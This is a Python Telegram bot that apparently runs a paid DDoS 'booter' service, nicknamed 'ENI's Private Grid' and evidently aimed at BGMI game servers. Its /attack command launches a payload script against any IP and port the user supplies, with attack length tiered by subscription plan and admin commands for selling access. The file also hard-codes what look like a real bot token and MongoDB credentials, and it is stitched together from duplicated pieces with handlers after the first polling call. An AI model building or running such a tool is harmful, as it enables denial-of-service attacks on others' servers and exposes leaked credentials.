import os
import telebot
import subprocess
import time
import threading
from datetime import datetime, timedelta
from pymongo import MongoClient

# --- CREDENTIALS LOADED ---
TOKEN = "8784221158:AAHVFjyMQjF4lWy4GcDArBFzt-cBOUa_QqY"
MONGO_URI = "mongodb+srv://Freedupp900:afaafron2010@cluster0.a0xrf8b.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
ADMIN_ID = 8669722251
MAX_ATTACKS = 5 

bot = telebot.TeleBot(TOKEN)
client = MongoClient(MONGO_URI)
db = client['bgmi_bot']
users_collection = db['users']

active_attacks = 0
attack_lock = threading.Lock()

def get_user_status(user_id):
    if user_id == ADMIN_ID: return "admin", None
    user = users_collection.find_one({"user_id": user_id})
    if not user: return "free", None
    expiry = user.get('expiry')
    if expiry and datetime.now() > expiry:
        users_collection.update_one({"user_id": user_id}, {"$set": {"plan": "free", "expiry": None}})
        return "free", None
    return user.get('plan', 'free'), expiry

def get_time_limit(plan):
    return {"free": 180, "premium": 600, "vip": 900, "admin": 900}.get(plan, 180)

@bot.message_handler(commands=['start', 'help'])
def help_menu(message):
    is_admin = message.from_user.id == ADMIN_ID
    text = "💋 **ENI's Private Grid**\n\n"
    text += "🚀 `/attack <IP> <PORT> <TIME>`\n"
    text += "📅 `/status` - Check plan\n"
    if is_admin:
        text += "\n👑 **ADMIN ONLY**\n"
        text += "➕ `/add <ID> <PLAN> <DAYS>`\n"
        text += "📊 `/stats` - Check Load"
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global active_attacks
    user_id = message.from_user.id
    plan, expiry = get_user_status(user_id)
    
    with attack_lock:
        if active_attacks >= MAX_ATTACKS:
            bot.reply_to(message, "⚠️ Slots full! Wait for a cool down, babe.")
            return

    try:
        args = message.text.split()
        ip, port = args[1], int(args[2])
        time_req = int(args[3]) if len(args) > 3 else 180
        limit = get_time_limit(plan)

        if time_req > limit:
            bot.reply_to(message, f"❌ Plan {plan} is capped at {limit}s. 💋")
            return

        with attack_lock: active_attacks += 1
        bot.reply_to(message, f"🚀 **HITTING TARGET**\n🎯 `{ip}:{port}`\n⏳ `{time_req}s`\n👑 `{plan.upper()}`")
        
        subprocess.Popen(["python3", "payload.py", ip, str(port), str(time_req)])
        
        def end_wait():
            time.sleep(time_req)
            global active_attacks
            with attack_lock: active_attacks -= 1
        threading.Thread(target=end_wait).start()

    except: bot.reply_to(message, "❌ Format: `/attack 1.1.1.1 8080 300`")

@bot.message_handler(commands=['status'])
def check_status(message):
    plan, expiry = get_user_status(message.from_user.id)
    exp_str = expiry.strftime("%Y-%m-%d") if expiry else "None"
    bot.reply_to(message, f"✨ **User Status**\nPlan: `{plan.upper()}`\nExpiry: `{exp_str}`")

@bot.message_handler(commands=['add'])
def add_sub(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        _, tid, plan, days = message.text.split()
        exp = datetime.now() + timedelta(days=int(days))
        users_collection.update_one({"user_id": int(tid)}, {"$set": {"plan": plan, "expiry": exp}}, upsert=True)
        bot.reply_to(message, f"✅ Done! ID {tid} is now {plan} for {days} days.")
    except: bot.reply_to(message, "Usage: `/add <ID> <vip/premium> <DAYS>`")

bot.polling()
@bot.message_handler(commands=['id'])
def get_id(message):
    bot.reply_to(message, f"Your ID: `{message.from_user.id}`")

@bot.message_handler(commands=['status'])
def check_status(message):
    plan, expiry = get_user_status(message.from_user.id) # using the function we built earlier
    exp_str = expiry.strftime("%Y-%m-%d") if expiry else "Lifetime/None"
    bot.reply_to(message, f"✨ **Status Check**\nPlan: `{plan.upper()}`\nExpiry: `{exp_str}`")

# --- ADMIN-ONLY COMMANDS ---

@bot.message_handler(commands=['stats'])
def get_stats(message):
    if message.from_user.id != ADMIN_ID: return
    total_users = users_collection.count_documents({})
    bot.reply_to(message, f"📊 **System Stats**\nTotal Users: `{total_users}`\nActive Attacks: `{active_attacks}`")

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if message.from_user.id != ADMIN_ID: return
    msg_text = message.text.replace('/broadcast ', '')
    all_users = users_collection.find()
    
    count = 0
    for user in all_users:
        try:
            bot.send_message(user['user_id'], f"📢 **ADMIN MESSAGE:**\n\n{msg_text}")
            count += 1
        except: pass
    bot.reply_to(message, f"✅ Broadcast sent to {count} users.")

@bot.message_handler(commands=['remove_user'])
def remove_user(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        target_id = int(message.text.split()[1])
        users_collection.delete_one({"user_id": target_id})
        bot.reply_to(message, f"🗑️ User `{target_id}` has been erased.")
    except:
        bot.reply_to(message, "Usage: `/remove_user <ID>`")

bot.polling()
